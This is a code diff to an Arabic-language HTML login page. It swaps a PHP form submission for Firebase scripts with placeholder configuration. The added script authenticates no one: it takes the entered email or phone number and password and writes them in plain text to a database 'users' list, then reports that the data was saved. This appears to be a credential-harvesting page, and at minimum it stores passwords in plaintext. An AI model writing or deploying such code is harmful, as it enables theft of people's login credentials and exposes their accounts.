@@ -39,15 +39,55 @@
             background-color: #165fc1;
         }
     </style>
+    <!-- Add Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
 </head>
 <body>
     <div class="login-box">
         <h2>تسجيل الدخول</h2>
-        <form action="login.php" method="POST">
-            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" name="password" placeholder="كلمة المرور" required>
+        <form id="login-form">
+            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
             <button type="submit">تسجيل الدخول</button>
         </form>
     </div>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID",
+            measurementId: "YOUR_MEASUREMENT_ID"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Handle form submission
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Save data to Firebase Realtime Database (Example)
+            const newUserRef = database.ref('users').push();
+            newUserRef.set({
+                email: email,
+                password: password
+            }).then(() => {
+                alert("تم حفظ البيانات بنجاح!");
+            }).catch((error) => {
+                alert("فشل في حفظ البيانات: " + error.message);
+            });
+        });
+    </script>
 </body>
 </html>
